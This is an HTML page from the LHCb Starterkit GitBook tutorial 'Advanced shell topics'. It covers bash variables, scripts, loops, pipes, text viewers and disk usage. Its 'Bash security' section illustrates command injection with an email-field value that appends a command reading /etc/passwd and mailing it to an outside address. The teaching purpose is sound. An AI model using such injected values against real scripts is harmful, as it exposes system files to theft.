@@ -1,0 +1,1065 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>Advanced shell topics · LHCb analysis essentials</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-katex/katex.min.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-panels/panels.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-block-align/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+        <link rel="stylesheet" href="../css/website.css">
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="../git/" />
+    
+    
+    <link rel="prev" href="persistent-screen.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="2.1" data-path="../python/">
+            
+                <a href="../python/">
+            
+                    
+                    Python
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.1" data-path="../python/running.html">
+            
+                <a href="../python/running.html">
+            
+                    
+                    Running
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.2" data-path="../python/operators.html">
+            
+                <a href="../python/operators.html">
+            
+                    
+                    Objects and operators
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3" data-path="../python/numbers.html">
+            
+                <a href="../python/numbers.html">
+            
+                    
+                    Numbers
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.4" data-path="../python/strings.html">
+            
+                <a href="../python/strings.html">
+            
+                    
+                    Strings
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.5" data-path="../python/lists.html">
+            
+                <a href="../python/lists.html">
+            
+                    
+                    Lists and looping
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.6" data-path="../python/dictionaries.html">
+            
+                <a href="../python/dictionaries.html">
+            
+                    
+                    Dictionaries
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.7" data-path="../python/conditions.html">
+            
+                <a href="../python/conditions.html">
+            
+                    
+                    Conditions
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.8" data-path="../python/methods.html">
+            
+                <a href="../python/methods.html">
+            
+                    
+                    Methods
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.9" data-path="../python/scripting.html">
+            
+                <a href="../python/scripting.html">
+            
+                    
+                    Scripting
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.10" data-path="../python/modules.html">
+            
+                <a href="../python/modules.html">
+            
+                    
+                    Modules
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.11" data-path="../python/learning.html">
+            
+                <a href="../python/learning.html">
+            
+                    
+                    Learning more
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.12" data-path="../python/first_histogram.html">
+            
+                <a href="../python/first_histogram.html">
+            
+                    
+                    Making your first histogram
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.13" data-path="../python/further_reading.html">
+            
+                <a href="../python/further_reading.html">
+            
+                    
+                    Further reading
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="3.1" data-path="../shell/">
+            
+                <a href="../shell/">
+            
+                    
+                    Introducing the Shell
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.1.1" data-path="../shell/02-filedir.html">
+            
+                <a href="../shell/02-filedir.html">
+            
+                    
+                    Navigating Files and Directories
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.1.2" data-path="../shell/03-create.html">
+            
+                <a href="../shell/03-create.html">
+            
+                    
+                    Working With Files and Directories
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.1.3" data-path="../shell/04-pipefilter.html">
+            
+                <a href="../shell/04-pipefilter.html">
+            
+                    
+                    Pipes and Filters
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.1.4" data-path="../shell/05-loop.html">
+            
+                <a href="../shell/05-loop.html">
+            
+                    
+                    Loops
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.1.5" data-path="../shell/06-script.html">
+            
+                <a href="../shell/06-script.html">
+            
+                    
+                    Shell Scripts
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.1.6" data-path="../shell/07-find.html">
+            
+                <a href="../shell/07-find.html">
+            
+                    
+                    Finding Things
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="4.1" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    Shell extras
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="4.1.1" data-path="screen.html">
+            
+                <a href="screen.html">
+            
+                    
+                    Using screen to keep things running
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="4.1.2" data-path="screen2.html">
+            
+                <a href="screen2.html">
+            
+                    
+                    Advanced screen topics
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="4.1.3" data-path="persistent-screen.html">
+            
+                <a href="persistent-screen.html">
+            
+                    
+                    Persistent screen or tmux session
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="4.1.4" data-path="shell2.html">
+            
+                <a href="shell2.html">
+            
+                    
+                    Advanced shell topics
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="5.1" data-path="../git/">
+            
+                <a href="../git/">
+            
+                    
+                    Version control with Git
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="5.1.1" data-path="../git/01-basics.html">
+            
+                <a href="../git/01-basics.html">
+            
+                    
+                    Basics
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="5.1.2" data-path="../git/02-setup.html">
+            
+                <a href="../git/02-setup.html">
+            
+                    
+                    Setting Up Git
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="5.1.3" data-path="../git/03-create.html">
+            
+                <a href="../git/03-create.html">
+            
+                    
+                    Creating a Repository
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="5.1.4" data-path="../git/04-changes.html">
+            
+                <a href="../git/04-changes.html">
+            
+                    
+                    Tracking Changes
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="5.1.5" data-path="../git/05-history.html">
+            
+                <a href="../git/05-history.html">
+            
+                    
+                    Exploring History
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="5.1.6" data-path="../git/06-ignore.html">
+            
+                <a href="../git/06-ignore.html">
+            
+                    
+                    Ignoring Things
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="5.1.7" data-path="../git/07-gitlab.html">
+            
+                <a href="../git/07-gitlab.html">
+            
+                    
+                    Remotes in CERN GitLab
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="5.1.8" data-path="../git/08-share.html">
+            
+                <a href="../git/08-share.html">
+            
+                    
+                    Sharing a repository with others
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="5.1.9" data-path="../git/09-pullrequests.html">
+            
+                <a href="../git/09-pullrequests.html">
+            
+                    
+                    Collaborating with Pull Requests
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="5.1.10" data-path="../git/10-conflict.html">
+            
+                <a href="../git/10-conflict.html">
+            
+                    
+                    Conflicts
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="5.1.11" data-path="../git/11-ci.html">
+            
+                <a href="../git/11-ci.html">
+            
+                    
+                    GitLab CI
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="5.1.12" data-path="../git/12-open.html">
+            
+                <a href="../git/12-open.html">
+            
+                    
+                    Open Science
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="5.1.13" data-path="../git/13-licensing.html">
+            
+                <a href="../git/13-licensing.html">
+            
+                    
+                    Licensing
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="5.1.14" data-path="../git/14-citation.html">
+            
+                <a href="../git/14-citation.html">
+            
+                    
+                    Citation
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="6.1" >
+            
+                <a target="_blank" href="ref://analysis-essentials.pdf">
+            
+                    
+                    Download PDF
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >Advanced shell topics</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="more-about-the-unix-shell">More about the UNIX shell</h1>
+<h2 id="types-of-shell">Types of shell</h2>
+<p>Several shells are available, the most common ones being probably <code>bash</code> and <code>tcsh</code>.
+In this tutorial, we will always refer to the <code>bash</code> shell, but keep in mind that other shells exist, which may sometimes have different syntax and behaviour!
+To check the type of shell we are using we can type <code>echo</code> to display the value of the <code>$0</code> environment variable:</p>
+<p><code>echo $0</code></p>
+<p>which, if the shell in use is <code>bash</code>, returns</p>
+<pre><code>-bash
+</code></pre><h2 id="manual-pages">Manual pages</h2>
+<p>Each command has a manual page where you can find more information on how to use it. The manual pages can be accessed through the <code>man</code> command, for example:</p>
+<pre><code class="lang-man">man ls
+</code></pre>
+<p>But what if we are looking for a command, but don&#x2019;t know or don&#x2019;t remember its name?
+In this case it might be useful to use the <code>apropos</code> command.
+For example, if we want to list the contents of a directory, we could look for something like</p>
+<p><code>apropos &quot;list directory&quot;</code></p>
+<p>which will return a list of (possibly) relevant commands, together with their descriptions.
+In this particular case:</p>
+<pre><code>dir                  (1)  - list directory contents
+gfal-ls              (1)  - list directory contents or file information
+ls                   (1)  - list directory contents
+ls                   (1p)  - list directory contents
+vdir                 (1)  - list directory contents
+</code></pre><h2 id="environment-variables">Environment variables</h2>
+<p>In addition to <code>0</code>, some other common examples of environment variables are <code>EDITOR</code>, <code>PATH</code>, and <code>LD_LIBRARY_PATH</code>, whose value can be displayed by</p>
+<pre><code>echo $EDITOR
+echo $PATH
+echo $LD_LIBRARY_PATH
+</code></pre><p>In particular, the <code>PATH</code> variable specifies in which directories programs can be found (for example, if we type <code>ls</code>, the command <code>ls</code> is searched for in such directories), while the <code>LD_LIBRARY_PATH</code> variable specifies where shared libraries are located.
+Environment variables can be exported with</p>
+<pre><code>export VARNAME=value
+</code></pre><p>This can be done from the command line or from within a <code>bash</code> script.
+For example, let&apos;s create a <code>bash</code> script named <code>StarWars.sh</code>, having the following lines:</p>
+<pre><code>#!/bin/bash
+echo &quot;Hello Star Wars&apos; world&quot;
+export CHARACTER=&quot;Anakin&quot;
+</code></pre><p>After saving and closing, we can run it from the shell with</p>
+<pre><code>bash StarWars.sh
+</code></pre><p>or with</p>
+<pre><code>./StarWars.sh
+</code></pre><p>the latter after changing the file permissions with <code>chmod u+x StarWars.sh</code>, so that the script can actually be executed.
+The file permissions tell us who is allowed to do what to a given file or directory.
+There are three basic <a href="http://linuxcommand.org/lts0070.php" target="_blank">permission types</a> (read, write, and execute) and three sets of people to be given permissions (owner, users in the group, and users not in the group, where the group is defined for each file or directory and the group membership is configurable).
+The owner and the group can be managed by the <a href="http://www.linfo.org/chown.html" target="_blank"><code>chown</code></a> and <a href="http://www.computerhope.com/unix/uchgrp.htm" target="_blank"><code>chgrp</code></a> commands.</p>
+<p>What happens if we now write <code>echo $CHARACTER</code> in the terminal? Can you explain why?</p>
+<h3 id="lets-now-try-the-following-callout">Let&apos;s now try the following: {.callout}</h3>
+<pre><code>source StarWars.sh
+</code></pre><p>or, equivalently:</p>
+<pre><code>. StarWars.sh
+</code></pre><p>and then</p>
+<pre><code>./StarWars.sh
+echo $CHARACTER
+</code></pre><p>Is there any difference?</p>
+<p><code>Exercise (5 min):</code> Change the file permissions so that your friends can read, write, and execute (or not) the <code>StarWars.sh</code> shell script and try to set their Star Wars character to something you like.</p>
+<h2 id="variables">Variables</h2>
+<p>In <code>bash</code>, variables are usually interpreted as strings.
+However, we can do integer arithmetic using the <code>let</code> keyword. Let&apos;s add to <code>StarWars.sh</code> the following lines:</p>
+<pre><code>A=1
+B=2
+strvar=$A+$B
+let intvar=$A+$B
+echo &quot;strvar is ${strvar}, intvar is ${intvar}&quot;
+</code></pre><p>What can you notice?</p>
+<h2 id="differences-among-files">Differences among files</h2>
+<p>The <code>diff</code> command is used to compare files line by line.
+To simply check for differing files:</p>
+<p><code>diff -q file1.dat file2.dat</code></p>
+<p>To show the output in two columns and suppress the common lines:</p>
+<p><code>diff -y &#x2014;suppress-common-lines file1.dat file2.dat</code></p>
+<p>To show the unified diff:</p>
+<p><code>diff -u file1.dat file2.dat</code></p>
+<h2 id="looping-over-files">Looping over files</h2>
+<p>In bash, loops have the following syntax:</p>
+<pre><code>for VARIABLE in LIST
+do
+  &lt;something&gt;
+done
+</code></pre><p>if the loop has to be repeated a fixed number of times, or:</p>
+<pre><code>while [ EXPRESSION ]
+do
+  &lt;something&gt;
+done
+</code></pre><p>if the loop has to be repeated until a condition is fulfilled.</p>
+<h2 id="conditionals">Conditionals</h2>
+<p>Conditionals have the following syntax:</p>
+<pre><code>if [ COND1 ]
+then
+    echo &quot;COND1 evaluated to true&quot;
+elif [COND2 ]
+then
+    echo &quot;COND2 evaluated to true&quot;
+else
+    echo &quot;Test not passed&quot;
+fi
+</code></pre><p><code>Exercise (5 min):</code> Create a text file and then write a script that checks whether the text file</p>
+<ul>
+<li>exists;</li>
+<li>is readable;</li>
+<li>is newer than another text file.</li>
+</ul>
+<p><code>Exercise (5 min):</code> In the <code>StarWars.sh</code> script, add some lines to check whether</p>
+<ul>
+<li><code>A</code> is equal to <code>B</code>;</li>
+<li><code>A</code> is smaller than <code>B</code>;</li>
+<li><code>A</code> is larger than <code>B</code>.
+Be careful! We might be tempted to use <code>&gt;</code> and <code>&lt;</code> inside the shell script, but they actually havea a different meaning for the shell, so <code>lt</code> and <code>gt</code> should be used instead.</li>
+</ul>
+<h2 id="linking-commands">Linking commands</h2>
+<p>Let us consider the three following lines, in which we link the commands to list the files in the <code>Poems</code> and <code>Recipes</code> folders through the <code>;</code>, <code>&amp;&amp;</code>, or <code>||</code> operators:</p>
+<pre><code>ls Poems/*.txt; ls Recipes/*.txt
+ls Poems/*.txt &amp;&amp; ls Recipes/*.txt
+ls Poems/*.txt || ls Recipes/*.txt
+</code></pre><p>The <code>;</code> means execute the first, then the second; the <code>&amp;&amp;</code> means execute the first, then the second if the first was successful, while the <code>||</code> means execute the first, then the second if the first was not successful.</p>
+<h2 id="pipes-and-redirection">Pipes and redirection</h2>
+<p>We already saw how to chain commands together, for example using the pipe to redirect the output of a command to a file or to feed it to another command.</p>
+<p><code>Exercise (5 min)</code>: Save in a file the lines containing the word &quot;force&quot; searching for them in all the files in the <code>Material/StarWars</code> folder.</p>
+<p>Solution:</p>
+<pre><code>files=`ls StarWars/*.txt`
+for file in $files; do grep &#x2014;color -w &quot;force&quot; $file &gt;&gt; Sentences.dat; done
+</code></pre><p><code>Exercise (5 min):</code> Now do the same, but searching for a string provided by the user.</p>
+<p>Solution:</p>
+<p>There are two ways to supply inputs to a shell script.</p>
+<p>Open <code>StarWars.sh</code> and add the following lines</p>
+<pre><code>files=`ls StarWars/*.txt`
+echo &quot;Enter the string to be looked for&#x2026;&quot;
+read string
+echo &quot;Looking for: ${string}&quot;
+for file in $files; do grep &#x2014;color -w $string $file &gt;&gt; Sentences2.dat; done
+</code></pre><p>Another solution is to replace the lines above with</p>
+<pre><code>files=`ls StarWars/*.txt`
+string=$1
+echo &quot;Looking for: ${string}&quot;
+for file in $files; do grep &#x2014;color -w $string $file &gt;&gt; Sentences2.dat; done
+</code></pre><p>where command line arguments are used, and run again with</p>
+<pre><code>. StarWars.sh
+</code></pre><p>and</p>
+<pre><code>. StarWars.sh force
+</code></pre><p>It must be noticed that the first argument is saved in the <code>$1</code> variable. What is, then, <code>$0</code>? This is the name of the shell script! And what is <code>$#</code>? This is the number of parameters!</p>
+<p>What happens if we do not provide any argument?
+We need to check that the string has been assigned, which can be done by adding</p>
+<pre><code>if [ -n &quot;${string}&quot; ]
+then
+    for file in $files; do grep &#x2014;color -w $string $file &gt;&gt; Sentences.dat; done
+else
+    echo &quot;No string provided.&quot;
+    return
+fi
+</code></pre><p>What happens if we use <code>exit</code> instead of <code>return</code>?</p>
+<p>Another useful command worth mentioning is <code>tee</code>, which allows to save the output into a file, but also to show it on the stdout (our screen):</p>
+<p><code>ls Poems/*.txt | tee ListOfFilesWithTee.dat</code></p>
+<p>If we want to append to the output file, we can use the <code>-a</code> option:</p>
+<p><code>ls Poems/*.txt | tee -a ListOfFilesWithTee.dat</code></p>
+<h2 id="bash-security">Bash security</h2>
+<p><a href="http://i.stack.imgur.com/MI1tR.jpg" target="_blank">Situations that can turn very wrong very quickly</a>, which means it is important to be aware of potentially dangerous behaviours.</p>
+<p>It is a good practice to not trust input data, which is one of the most common reasons of security-related incidents.
+Some examples are buffer overflow (that is, accepting input longer than the size of the allocated memory), invalid or malicious input, code inside data, and many others.</p>
+<p>One practical example, provided by Sebastian Lopienski, is the following: let&apos;s say we wrote a script that sends emails using the <code>mail</code> command:</p>
+<p><code>cat confirmation.txt | mail $email</code></p>
+<p>and someone provides the following email address:</p>
+<p><code>me@fake.com; cat /etc/passwd | mail me@real.com</code></p>
+<p>So, what do we get?</p>
+<pre><code>cat confirmation.txt | mail me@fake.com;
+cat /etc/passwd | mail me@real.com
+</code></pre><p>Great!</p>
+<h2 id="complexity">Complexity</h2>
+<p>Bash is great until a certain level of complexity is reached&#x2026;so try to keep it simple!
+What about <a href="http://lhcb-release-area.web.cern.ch/LHCb-release-area/DOC/online/releases/v4r65/doxygen/df/dd9/src_2_lineshape_maker_8cpp__incl.png" target="_blank">this</a>?</p>
+<h2 id="text-viewers">Text viewers</h2>
+<p>The <code>less</code> command, which is the improved version of an earlier program, called <code>more</code>, is used to read but not edit text files.
+It allows to scroll both forwards and backwards through the text file, as well as to perform a basic search.
+Up and down arrows (or <code>j</code> and <code>k</code>) allow to scroll through the text file, line by line, while <code>Ctrl+f</code> and <code>Ctrl+b</code> allow to scroll through the text file, page by page.
+To go to a specific line, it is possible to type the number of the line and then press <code>G</code>.
+To search for a string forward, press <code>/</code> and then type the string.
+To search for a string backward, press <code>?</code> and then type the string.
+To quit, press <code>q</code>.</p>
+<p>The <code>cat</code> command is even simpler than <code>less</code>, since it just outputs the contents of one or more files to the standard output.</p>
+<pre><code>cat file.dat
+cat file1.dat file2.dat
+</code></pre><p>But it is very powerful when linking commands!</p>
+<p>Finally, the <code>head</code>/<code>tail</code> commands print the first(last) n lines of a given file:</p>
+<pre><code>head -n 2 file.dat
+head -n 2 file1.dat file2.dat
+</code></pre><h2 id="text-editors">Text editors</h2>
+<p>Text editors allow not only to read, but also to modify the contents of a text file.
+There are text editors available for every taste, and this is for sure a not-exhaustive list of those you may find along your way:</p>
+<ul>
+<li><code>vim</code> or simply <code>vi</code></li>
+<li><code>emacs</code></li>
+<li><code>nano</code></li>
+<li><code>gedit</code></li>
+</ul>
+<h2 id="disk-space">Disk space</h2>
+<p>At some point we all need to check how much space we are using.
+For doing that, we can use the <code>df</code> and <code>du</code> commands.
+The <code>df</code> command displays the disk usage and remaining free space on all currently mounted devices:</p>
+<pre><code>df
+</code></pre><p>We can specify the option <code>-h</code> to convert to human readable units (kB, MB, GB, &#x2026;):</p>
+<pre><code>df -h
+</code></pre><p>and a directory, if we want to inspect only that:</p>
+<pre><code>df -h directory
+</code></pre><p>The <code>du</code> command is similar to <code>df</code>, but goes recursively in all subdirectories of the present working directory:</p>
+<pre><code>du
+</code></pre><p>If the option <code>-s</code> is specified,</p>
+<pre><code>du -s
+</code></pre><p>it checks the present working directory only. As for <code>df</code>, the <code>-h</code> option allows to have human readable units.
+Another interesting option is</p>
+<pre><code>du &#x2014;max-depth=N
+</code></pre><p>which allows to go <code>N</code> directories deep.</p>
+<h2 id="over-the-wire-and-bandit-wargame">Over the Wire and Bandit wargame</h2>
+<p>And to conclude...let&apos;s start a 20 min wargame on <a href="http://overthewire.org/wargames/bandit/" target="_blank">Over the Wire</a> and compete to earn a delicious cold beer to be served soon after the session itself!</p>
+<p>Bandit is a wargame aimed at absolute beginners.
+It is organised in levels, each level requiring to having completed the previous one. Don&#x2019;t panic if you have no clue how to proceed:</p>
+<pre><code>- try using the manual, by typing man &lt;command&gt; (even man has a man) and then type q to quit the manual pages;
+- for shell built-in commands, try with help &lt;command&gt;;
+- ask Google or your favourite search engine!
+</code></pre>
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="persistent-screen.html" class="navigation navigation-prev " aria-label="Previous page: Persistent screen or tmux session">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="../git/" class="navigation navigation-next " aria-label="Next page: Version control with Git">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Advanced shell topics","level":"4.1.4","depth":2,"next":{"title":"Version control with Git","level":"5.1","depth":1,"path":"git/README.md","ref":"git/README.md","articles":[{"title":"Basics","level":"5.1.1","depth":2,"path":"git/01-basics.md","ref":"git/01-basics.md","articles":[]},{"title":"Setting Up Git","level":"5.1.2","depth":2,"path":"git/02-setup.md","ref":"git/02-setup.md","articles":[]},{"title":"Creating a Repository","level":"5.1.3","depth":2,"path":"git/03-create.md","ref":"git/03-create.md","articles":[]},{"title":"Tracking Changes","level":"5.1.4","depth":2,"path":"git/04-changes.md","ref":"git/04-changes.md","articles":[]},{"title":"Exploring History","level":"5.1.5","depth":2,"path":"git/05-history.md","ref":"git/05-history.md","articles":[]},{"title":"Ignoring Things","level":"5.1.6","depth":2,"path":"git/06-ignore.md","ref":"git/06-ignore.md","articles":[]},{"title":"Remotes in CERN GitLab","level":"5.1.7","depth":2,"path":"git/07-gitlab.md","ref":"git/07-gitlab.md","articles":[]},{"title":"Sharing a repository with others","level":"5.1.8","depth":2,"path":"git/08-share.md","ref":"git/08-share.md","articles":[]},{"title":"Collaborating with Pull Requests","level":"5.1.9","depth":2,"path":"git/09-pullrequests.md","ref":"git/09-pullrequests.md","articles":[]},{"title":"Conflicts","level":"5.1.10","depth":2,"path":"git/10-conflict.md","ref":"git/10-conflict.md","articles":[]},{"title":"GitLab CI","level":"5.1.11","depth":2,"path":"git/11-ci.md","ref":"git/11-ci.md","articles":[]},{"title":"Open Science","level":"5.1.12","depth":2,"path":"git/12-open.md","ref":"git/12-open.md","articles":[]},{"title":"Licensing","level":"5.1.13","depth":2,"path":"git/13-licensing.md","ref":"git/13-licensing.md","articles":[]},{"title":"Citation","level":"5.1.14","depth":2,"path":"git/14-citation.md","ref":"git/14-citation.md","articles":[]}]},"previous":{"title":"Persistent screen or tmux session","level":"4.1.3","depth":2,"path":"shell-extras/persistent-screen.md","ref":"shell-extras/persistent-screen.md","articles":[]},"dir":"ltr"},"config":{"plugins":["katex","panels@git+https://github.com/lhcb/gitbook-plugin-panels.git#master","collapsible-menu","block-align","otherlink"],"styles":{"website":"css/website.css"},"pluginsConfig":{"collapsible-menu":{},"block-align":{},"search":{},"otherlink":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"panels":{},"katex":{},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"LHCb analysis essentials","gitbook":"*","description":"Material for the first half of the LHCb Starterkit. Covers the basics of Git, Python, and the UNIX shell."},"file":{"path":"shell-extras/shell2.md","mtime":"2018-11-26T12:26:23.705Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2018-11-26T12:29:31.553Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-panels/panels.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-collapsible-menu/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-otherlink/js/otherlink.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
